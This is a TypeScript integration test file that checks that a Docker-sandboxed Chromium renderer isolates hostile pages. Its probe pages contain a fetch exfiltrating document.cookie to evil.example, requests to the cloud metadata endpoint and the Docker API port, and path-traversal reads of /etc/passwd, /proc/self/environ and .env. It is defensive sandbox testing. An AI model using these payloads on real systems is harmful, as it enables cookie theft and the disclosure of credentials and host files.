/**
 * Real Chromium, in the real browser container, against hostile pages.
 *
 * Every page here is generated-site code doing what hostile or broken client
 * JavaScript would: throw, log without bound, load missing assets, reach an
 * attacker, the metadata endpoint or a WebSocket, read host files through the
 * server or `file:`, redirect away, open popups, and spin forever. A page's
 * only channel back is its console, which the report carries — bounded and
 * sanitized — so what a probe observed can be checked. The container itself is
 * inspected while it runs.
 *
 * Integration: needs a Docker daemon (and, once, network to pull the pinned
 * image and install the pinned client).
 */
import { execFile } from 'node:child_process';
import { createHash } from 'node:crypto';
import { access, mkdir, mkdtemp, readdir, readFile, rm, writeFile } from 'node:fs/promises';
import { homedir, tmpdir } from 'node:os';
import { join, relative, sep } from 'node:path';
import { promisify } from 'node:util';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import type { BrowserFinding, BrowserRenderReport } from '@statxai/contracts';
import {
  BROWSER_REPORT_BOUNDS,
  SANDBOX_LABEL,
  buildSite,
  renderInBrowser,
  scaffoldSite,
  type BrowserRenderOptions,
} from '../src/index.js';

const exec = promisify(execFile);

const FAKE_SECRETS = {
  OPENAI_API_KEY: 'sk-browser-probe-openai-5d21',
  VERCEL_TOKEN: 'vercel-browser-probe-token-8e10',
  MONGODB_URI: 'mongodb://harness:browser-probe-mongo-pw@mongo.internal:27017/statxai',
};
const saved: Record<string, string | undefined> = {};

let root: string;
let exportDir: string;
let workRoot: string;
let sentinel: string;

const SUBJECT = {
  projectId: 'proj_browser_probe',
  sitePlan: { name: 'site-plan', version: 7 },
  sourceCommit: 'c0ffee0000000000000000000000000000000000',
  authority: { mode: 'legacy_direct' as const },
};

const page = (body: string, head = '') => `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>probe</title>${head}</head><body><main><h1>probe</h1></main>${body}</body></html>`;
const probe = (script: string) => page(`<script>${script}</script>`);

async function writeExport(dir: string): Promise<void> {
  const files: Record<string, string> = {
    'index.html': page('<p>healthy</p>', '<link rel="stylesheet" href="/style.css">'),
    'style.css': 'body { font-family: sans-serif; }',
    'about.html': page('<p>about</p>'),
    'asset.html': page('<script src="/missing.js"></script>', '<link rel="stylesheet" href="/missing.css">'),
    'throws.html': probe(`throw new Error('hydration boom');`),
    'console.html': probe(`console.error('app said no'); console.warn('only a warning');`),
    'giant.html': probe(
      `for (let i = 0; i < 300; i++) console.error('E' + i + ' ' + 'x'.repeat(20000));` +
        `console.error('leak ${homedir()}/.ssh/id_rsa ${FAKE_SECRETS.OPENAI_API_KEY}');`,
    ),
    'external.html': probe(`
      const report = (label) => console.error('PROBE ' + label);
      fetch('https://evil.example/steal?c=' + document.cookie).then(() => report('external-ok'), () => report('external-blocked'));
      fetch('http://169.254.169.254/latest/meta-data/').then(() => report('metadata-ok'), () => report('metadata-blocked'));
      fetch('http://127.0.0.1:2375/version').then(() => report('docker-ok'), () => report('docker-blocked'));
      const ws = new WebSocket('ws://1.1.1.1:80/');
      ws.onopen = () => report('ws-open');
      ws.onerror = () => report('ws-error');
      const img = new Image(); img.src = 'https://evil.example/pixel.png';
    `),
    'files.html': probe(`
      const paths = ['/../../etc/passwd', '/%2e%2e/%2e%2e/etc/passwd', '/..%2f..%2frunner%2fapp%2fjob.json', '/runner/app/job.json', '/package.json', '/proc/self/environ', '/.env'];
      for (const path of paths) fetch(path).then((r) => r.text().then((t) => console.error('PROBE ' + path + ' ' + r.status + ' ' + t.slice(0, 40))), () => console.error('PROBE ' + path + ' failed'));
      fetch('file://${'SENTINEL'}').then((r) => r.text().then((t) => console.error('PROBE file-ok ' + t)), () => console.error('PROBE file-blocked'));
    `),
    'redirect.html': probe(`location.href = 'https://evil.example/landing';`),
    'refresh.html': page('', '<meta http-equiv="refresh" content="0;url=https://evil.example/refresh">'),
    'popup.html': page('<iframe src="https://evil.example/frame"></iframe>', '') .replace('</body>', `<script>window.open('https://evil.example/popup');</script></body>`),
    'spin.html': probe(`for (;;) {}`),
    'stall.html': probe(`addEventListener('load', () => setTimeout(() => { for (;;) {} }, 0));`),
  };
  await mkdir(dir, { recursive: true });
  for (const [path, contents] of Object.entries(files)) await writeFile(join(dir, path), contents.replace('SENTINEL', sentinel));
}

function options(routes: string[], overrides: Partial<BrowserRenderOptions> = {}): BrowserRenderOptions {
  return {
    exportDir,
    plan: { sitemap: { pages: routes.map((route) => ({ route })) } } as never,
    subject: SUBJECT,
    workRoot,
    // Long enough for a probe's asynchronous results to reach the console.
    readiness: { settleMs: 1_500 },
    ...overrides,
  };
}

const findingsOf = (report: BrowserRenderReport, route: string): BrowserFinding[] =>
  report.renders.filter((r) => r.route === route).flatMap((r) => r.findings);
const details = (findings: BrowserFinding[], category: BrowserFinding['category']) => findings.filter((f) => f.category === category).map((f) => f.detail);

const browserContainers = async () =>
  (await exec('docker', ['ps', '--all', '--quiet', '--filter', `label=${SANDBOX_LABEL}=browser`])).stdout.split('\n').filter(Boolean);
const chromiumOnHost = async () => (await exec('ps', ['-eo', 'args'])).stdout.split('\n').filter((line) => line.includes('/ms-playwright/'));
const runsLeft = async () => readdir(join(workRoot, 'runs')).catch(() => []);
const exists = (path: string) => access(path).then(() => true, () => false);

async function digest(dir: string): Promise<string> {
  const entries: string[] = [];
  const walk = async (current: string): Promise<void> => {
    for (const entry of await readdir(current, { withFileTypes: true })) {
      const full = join(current, entry.name);
      if (entry.isDirectory()) await walk(full);
      else entries.push(`${relative(dir, full).split(sep).join('/')}\0${createHash('sha256').update(await readFile(full)).digest('hex')}\n`);
    }
  };
  await walk(dir);
  return createHash('sha256').update(entries.sort().join('')).digest('hex');
}

beforeAll(async () => {
  for (const [key, value] of Object.entries(FAKE_SECRETS)) {
    saved[key] = process.env[key];
    process.env[key] = value;
  }
  root = await mkdtemp(join(tmpdir(), 'statxai-browser-probe-'));
  sentinel = join(root, 'host-sentinel.txt');
  await writeFile(sentinel, 'host-only sentinel contents');
  exportDir = join(root, 'out');
  workRoot = join(root, 'browser');
  await writeExport(exportDir);
}, 60_000);

afterAll(async () => {
  for (const [key, value] of Object.entries(saved)) {
    if (value === undefined) delete process.env[key];
    else process.env[key] = value;
  }
  if (root) await rm(root, { recursive: true, force: true });
});

describe('rendering an exact export', () => {
  let report: BrowserRenderReport;

  beforeAll(async () => {
    report = await renderInBrowser(options(['/', '/about']));
  }, 600_000);

  it('renders the homepage and a second planned route in real Chromium at every viewport', () => {
    expect(report.status).toBe('completed');
    expect(report.renders.map((r) => [r.route, r.viewport, r.status, r.httpStatus])).toEqual([
      ['/', 'desktop', 'rendered', 200], ['/', 'tablet', 'rendered', 200], ['/', 'mobile', 'rendered', 200],
      ['/about', 'desktop', 'rendered', 200], ['/about', 'tablet', 'rendered', 200], ['/about', 'mobile', 'rendered', 200],
    ]);
    expect(report.renders.every((r) => r.findings.length === 0 && r.readyMs !== null)).toBe(true);
    expect(report.passed).toBe(true);
    expect(report.viewports.map((v) => v.name)).toEqual(['desktop', 'tablet', 'mobile']);
  });

  it('records exactly the subject it was given and the digest of the bytes it rendered', async () => {
    expect(report.subject).toEqual({ ...SUBJECT, exportDigest: await digest(exportDir) });
    expect(report.runtime.playwright).toBe('1.63.0');
  });

  it('leaves no container, run directory or browser process behind after success', async () => {
    expect(await browserContainers()).toEqual([]);
    expect(await runsLeft()).toEqual([]);
    expect(await chromiumOnHost()).toEqual([]);
  });
});

describe('route failures are structured findings', () => {
  let report: BrowserRenderReport;

  beforeAll(async () => {
    report = await renderInBrowser(options(['/', '/missing', '/asset', '/throws', '/console']));
  }, 600_000);

  it('a planned route that 404s is a failed render', () => {
    expect(report.renders.filter((r) => r.route === '/missing').map((r) => [r.status, r.httpStatus])).toEqual([['failed', 404], ['failed', 404], ['failed', 404]]);
    expect(details(findingsOf(report, '/missing'), 'http_error')).toContain('HTTP 404');
    expect(report.passed).toBe(false);
  });

  it('a missing local stylesheet and script are local resource failures', () => {
    const failed = details(findingsOf(report, '/asset'), 'local_resource_failed');
    expect(failed.some((d) => d.includes('/missing.css'))).toBe(true);
    expect(failed.some((d) => d.includes('/missing.js'))).toBe(true);
    expect(report.renders.filter((r) => r.route === '/asset').every((r) => r.status === 'failed')).toBe(true);
  });

  it('a runtime exception makes the render unclean', () => {
    expect(details(findingsOf(report, '/throws'), 'runtime_exception')[0]).toContain('hydration boom');
    expect(report.renders.filter((r) => r.route === '/throws').every((r) => r.status === 'failed')).toBe(true);
  });

  it('console.error is captured separately; a warning is not', () => {
    const findings = findingsOf(report, '/console');
    expect(details(findings, 'console_error')).toEqual(['app said no', 'app said no', 'app said no']);
    expect(JSON.stringify(findings)).not.toContain('only a warning');
    expect(report.renders.filter((r) => r.route === '/console').every((r) => r.status === 'rendered')).toBe(true);
  });

  it('leaves nothing behind after a failing run', async () => {
    expect(await browserContainers()).toEqual([]);
    expect(await runsLeft()).toEqual([]);
  });
});

describe('isolation, probed from hostile pages', () => {
  let report: BrowserRenderReport;
  let inspected: { env: string[]; mounts: { Source: string; Destination: string; RW: boolean }[]; network: string; user: string; readonlyRoot: boolean } | null = null;

  beforeAll(async () => {
    const rendering = renderInBrowser(options(['/external', '/files', '/redirect', '/refresh', '/popup']));
    // Inspect the live container while it renders.
    const deadline = Date.now() + 120_000;
    while (inspected === null && Date.now() < deadline) {
      const [id] = await browserContainers();
      if (id) {
        const { stdout } = await exec('docker', ['inspect', '--format', '{{json .Config.Env}}|{{json .Mounts}}|{{.HostConfig.NetworkMode}}|{{.Config.User}}|{{.HostConfig.ReadonlyRootfs}}', id]).catch(() => ({ stdout: '' }));
        if (stdout) {
          const [env, mounts, network, user, readonlyRoot] = stdout.trim().split('|');
          inspected = { env: JSON.parse(env!), mounts: JSON.parse(mounts!), network: network!, user: user!, readonlyRoot: readonlyRoot === 'true' };
        }
      }
      await new Promise((resolve) => setTimeout(resolve, 50));
    }
    report = await rendering;
  }, 600_000);

  it('the container carries no harness secret — no fake OpenAI key, Vercel token or Mongo credentials', () => {
    expect(inspected).not.toBeNull();
    const env = inspected!.env.join('\n');
    for (const [key, value] of Object.entries(FAKE_SECRETS)) {
      expect(env).not.toContain(key);
      expect(env).not.toContain(value);
    }
    expect(inspected!.env).toContain('HOME=/tmp');
    expect(JSON.stringify(report)).not.toMatch(/sk-browser-probe|vercel-browser-probe|browser-probe-mongo-pw/);
  });

  it('mounts no repository, home, host /tmp or Docker socket; the export is read-only; no network; non-root', () => {
    const mounts = inspected!.mounts;
    expect(mounts.map((m) => m.Destination).sort()).toEqual(['/runner/app', '/runner/node_modules', '/site']);
    expect(mounts.every((m) => m.RW === false)).toBe(true);
    for (const m of mounts) {
      expect(m.Source).not.toBe(process.cwd());
      expect(m.Source).not.toBe(homedir());
      expect(m.Source).not.toBe(tmpdir());
      expect(m.Source).not.toMatch(/docker\.sock/);
      expect(m.Source.startsWith(workRoot)).toBe(true);
    }
    expect(inspected!.network).toBe('none');
    expect(inspected!.user).not.toMatch(/^0(:|$)/);
    expect(inspected!.readonlyRoot).toBe(true);
  });

  it('external HTTPS, the metadata endpoint and another local port cannot be reached, and are recorded', () => {
    const findings = findingsOf(report, '/external');
    const probes = details(findings, 'console_error');
    expect(probes).toEqual(expect.arrayContaining(['PROBE external-blocked', 'PROBE metadata-blocked', 'PROBE docker-blocked']));
    expect(probes.join('\n')).not.toMatch(/external-ok|metadata-ok|docker-ok/);
    const blocked = details(findings, 'external_request_blocked');
    expect(blocked).toEqual(expect.arrayContaining(['https://evil.example/steal', 'http://169.254.169.254/latest/meta-data/', 'https://evil.example/pixel.png']));
  });

  it('a WebSocket, which bypasses in-browser interception, still has no network to reach', () => {
    const probes = details(findingsOf(report, '/external'), 'console_error');
    expect(probes).toContain('PROBE ws-error');
    expect(probes).not.toContain('PROBE ws-open');
  });

  it('the static server serves only the export: traversal, the runner, host files and file: all fail', () => {
    const probes = details(findingsOf(report, '/files'), 'console_error');
    for (const path of ['/../../etc/passwd', '/%2e%2e/%2e%2e/etc/passwd', '/..%2f..%2frunner%2fapp%2fjob.json', '/runner/app/job.json', '/package.json', '/proc/self/environ', '/.env']) {
      expect(probes.some((p) => p.startsWith(`PROBE ${path} 404`))).toBe(true);
    }
    expect(probes).toContain('PROBE file-blocked');
    expect(JSON.stringify(report)).not.toContain('host-only sentinel contents');
    expect(JSON.stringify(report)).not.toMatch(/root:x:0:0|"port":4173/);
  });

  it('an external redirect, a meta refresh and a popup are blocked and recorded', () => {
    expect(details(findingsOf(report, '/redirect'), 'unexpected_navigation')).toContain('https://evil.example/landing');
    expect(details(findingsOf(report, '/refresh'), 'unexpected_navigation')).toContain('https://evil.example/refresh');
    // Neither an external frame nor a popup reaches its target, and neither takes the render down with it.
    const popup = findingsOf(report, '/popup');
    expect(details(popup, 'external_request_blocked')).toEqual(expect.arrayContaining(['https://evil.example/frame', 'https://evil.example/popup']));
    expect(report.renders.filter((r) => r.route === '/popup').map((r) => r.status)).toEqual(['rendered', 'rendered', 'rendered']);
    expect(report.renders.filter((r) => r.route === '/redirect').every((r) => r.status === 'failed')).toBe(true);
  });

  it('client JavaScript changes nothing on the host: the export is byte-identical and nothing was written beside it', async () => {
    const before = await digest(exportDir);
    expect(report.subject.exportDigest).toBe(before);
    expect((await readdir(root)).sort()).toEqual(['browser', 'host-sentinel.txt', 'out']);
    expect(await readFile(sentinel, 'utf8')).toBe('host-only sentinel contents');
  });
});

describe('bounds and sanitization', () => {
  it('giant console output is bounded per category, per message and in total, with host paths and secrets removed', async () => {
    const report = await renderInBrowser(options(['/giant']));

    for (const render of report.renders) {
      const consoleErrors = render.findings.filter((f) => f.category === 'console_error');
      expect(consoleErrors.length).toBeLessThanOrEqual(BROWSER_REPORT_BOUNDS.maxFindingsPerCategory);
      expect(consoleErrors.every((f) => f.detail.length <= BROWSER_REPORT_BOUNDS.maxDetailChars)).toBe(true);
    }
    expect(Buffer.byteLength(JSON.stringify(report))).toBeLessThanOrEqual(BROWSER_REPORT_BOUNDS.maxReportBytes);
    const text = JSON.stringify(report);
    expect(text).not.toContain(homedir());
    expect(text).not.toContain(FAKE_SECRETS.OPENAI_API_KEY);
  }, 600_000);
});

describe('readiness, timeouts and cancellation', () => {
  it('a page that never finishes loading times out deterministically and the run continues', async () => {
    const report = await renderInBrowser(options(['/spin', '/'], { readiness: { navigationTimeoutMs: 3_000, closeTimeoutMs: 2_000 } }));

    expect(report.renders.filter((r) => r.route === '/spin').map((r) => r.status)).toEqual(['timed_out', 'timed_out', 'timed_out']);
    expect(details(findingsOf(report, '/spin'), 'readiness_timeout')).toHaveLength(3);
    expect(report.renders.filter((r) => r.route === '/').map((r) => r.status)).toEqual(['rendered', 'rendered', 'rendered']);
    expect(await browserContainers()).toEqual([]);
  }, 600_000);

  it('a page that blocks after load is not ready within the bound', async () => {
    const report = await renderInBrowser(options(['/stall'], { readiness: { readyTimeoutMs: 2_000, closeTimeoutMs: 2_000 } }));
    expect(report.renders.map((r) => r.status)).toEqual(['timed_out', 'timed_out', 'timed_out']);
    expect(details(findingsOf(report, '/stall'), 'readiness_timeout')[0]).toContain('not ready within 2000ms');
  }, 600_000);

  it('the run’s wall clock destroys the container, the browser and the server', async () => {
    const started = Date.now();
    const report = await renderInBrowser(options(['/spin', '/about'], { limits: { maxRunMs: 8_000 }, readiness: { navigationTimeoutMs: 60_000 } }));

    expect(report.status).toBe('timed_out');
    expect(report.passed).toBe(false);
    expect(report.renders.every((r) => r.status === 'not_run' || r.status === 'timed_out')).toBe(true);
    expect(Date.now() - started).toBeLessThan(60_000);
    expect(await browserContainers()).toEqual([]);
    expect(await chromiumOnHost()).toEqual([]);
    expect(await runsLeft()).toEqual([]);
  }, 600_000);

  it('abort destroys the container and every Chromium descendant, and renders nothing further', async () => {
    const controller = new AbortController();
    const reason = new Error('run cancelled');
    const rendering = renderInBrowser(options(['/spin', '/', '/about'], { signal: controller.signal, readiness: { navigationTimeoutMs: 60_000 } }));

    const deadline = Date.now() + 120_000;
    while ((await chromiumOnHost()).length === 0) {
      if (Date.now() > deadline) throw new Error('Chromium never started');
      await new Promise((resolve) => setTimeout(resolve, 100));
    }
    controller.abort(reason);

    await expect(rendering).rejects.toBe(reason);
    expect(await chromiumOnHost()).toEqual([]);
    expect(await browserContainers()).toEqual([]);
    expect(await runsLeft()).toEqual([]);
  }, 600_000);

  it('an already-aborted signal starts nothing', async () => {
    const controller = new AbortController();
    controller.abort(new Error('before start'));
    await expect(renderInBrowser(options(['/'], { signal: controller.signal }))).rejects.toThrow('before start');
    expect(await browserContainers()).toEqual([]);
  });

  it('a malformed plan route is refused before any container exists', async () => {
    await expect(renderInBrowser(options(['/', 'javascript:alert(1)']))).rejects.toThrow(/Refusing to render/);
    expect(await browserContainers()).toEqual([]);
    expect(await runsLeft()).toEqual([]);
  });

  it('an empty export is reported unavailable without starting a browser', async () => {
    const empty = join(root, 'empty-export');
    await mkdir(empty, { recursive: true });
    const report = await renderInBrowser({ ...options(['/']), exportDir: empty });
    expect(report.status).toBe('unavailable');
    expect(report.passed).toBe(false);
    expect(await exists(join(empty, 'index.html'))).toBe(false);
    expect(await browserContainers()).toEqual([]);
  });
});

describe('a real Next.js export', () => {
  it('the sandboxed build’s exact export renders cleanly at every route and viewport', async () => {
    const site = join(root, 'next', 'app');
    await mkdir(site, { recursive: true });
    await scaffoldSite(site);
    await mkdir(join(site, 'app', 'about'), { recursive: true });
    await writeFile(join(site, 'app', 'about', 'page.tsx'), `export default function About() {\n  return <main><h1>About</h1></main>;\n}\n`);
    const built = await buildSite(site, { sandboxRoot: join(root, 'sandbox') });
    expect(built.ok).toBe(true);

    const report = await renderInBrowser({ ...options(['/', '/about']), exportDir: built.outDir, readiness: {} });

    expect(report.status).toBe('completed');
    expect(report.renders.map((r) => [r.route, r.viewport, r.status])).toEqual([
      ['/', 'desktop', 'rendered'], ['/', 'tablet', 'rendered'], ['/', 'mobile', 'rendered'],
      ['/about', 'desktop', 'rendered'], ['/about', 'tablet', 'rendered'], ['/about', 'mobile', 'rendered'],
    ]);
    // The export's own fonts and chunks all load from the local origin — nothing external was needed.
    const findings = report.renders.flatMap((r) => r.findings);
    expect(findings.filter((f) => f.category !== 'console_error')).toEqual([]);
    expect(report.subject.exportDigest).toBe(await digest(built.outDir));
  }, 900_000);
});
